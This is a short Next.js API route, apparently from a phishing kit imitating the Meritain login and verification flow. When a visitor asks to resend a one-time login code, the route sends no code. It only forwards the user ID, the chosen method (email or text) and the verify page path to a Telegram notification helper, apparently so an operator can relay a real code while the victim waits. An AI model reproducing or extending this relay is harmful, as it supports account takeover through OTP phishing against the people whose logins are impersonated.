import { NextRequest, NextResponse } from "next/server"

import { MERITAIN_VERIFY_PATH } from "@/lib/meritain-paths"
import { sendFormNotification } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  try {
    let method = "text"
    let userId = ""
    let typeHint = ""
    try {
      const body = (await request.json()) as {
        method?: string
        verificationType?: string
        userId?: string
        type?: string
      }
      typeHint = String(body.type ?? "").toLowerCase()
      method = String(body.verificationType ?? body.method ?? "").toLowerCase()
      userId = body.userId ?? ""
    } catch {
      /* empty body ok */
    }

    const looksEmail =
      typeHint.includes("email") || method.includes("email")
    const type = looksEmail
      ? "login_email_otp_resend"
      : "login_text_otp_resend"

    await sendFormNotification({
      type,
      userId,
      method: looksEmail ? "email" : "text",
      timestamp: new Date().toISOString(),
      page: MERITAIN_VERIFY_PATH,
    })
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending resend code notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
